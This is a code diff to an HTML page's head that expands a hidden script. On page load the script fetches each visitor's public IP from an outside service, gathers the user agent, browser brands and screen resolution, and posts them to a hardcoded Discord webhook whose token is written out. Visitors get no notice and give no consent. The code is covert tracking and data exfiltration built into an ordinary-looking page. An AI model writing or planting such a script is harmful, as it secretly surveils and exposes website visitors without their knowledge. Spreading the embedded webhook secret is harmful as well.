@@ -3,34 +3,49 @@
 <head>
 
   <script>
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H";
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1467160104033063015/8Pd3NDwOEJQw3RoKl3ip3CNzIcN6NBXTpJqivcrR4-WoY0hyrIVc-8F5jav_U2UeGD2H"; 
   const userAgent = navigator.userAgent;
 
+
+  let browserInfo;
+  if (navigator.userAgentData) {
+    // Chromium-based browsers
+    browserInfo = navigator.userAgentData.brands
+      .map(b => `${b.brand} v${b.version}`)
+      .join(", ");
+  } else {
+    // Fallback for non-Chromium browsers
+    const ua = navigator.userAgent;
+    if (ua.includes("Firefox")) browserInfo = "Firefox";
+    else if (ua.includes("Safari") && !ua.includes("Chrome")) browserInfo = "Safari";
+    else browserInfo = "Unknown / Not Chromium";
+  }
+
+  // Get screen resolution
+  const screenRes = `${screen.width}x${screen.height}`;
+
+  // Fetch public IP
   fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
     .then(data => {
       const ip = data.ip;
 
+      // Send all info to Discord webhook
       return fetch(WEBHOOK_URL, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          embeds: [
-            {
-              title: "New Visitor",
-              fields: [
-                { name: "IP Address", value: ip, inline: false },
-                { name: "User Agent", value: userAgent, inline: false }
-              ],
-              timestamp: new Date().toISOString()
-            }
-          ]
+          content: `New visitor:\nIP: ${ip}\nUser-Agent: ${userAgent}\nBrowser: ${browserInfo}\nScreen Resolution: ${screenRes}`
         })
       });
+    })
+    .catch(err => {
+      console.error("Error sending data:", err);
     });
 </script>
+
 
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
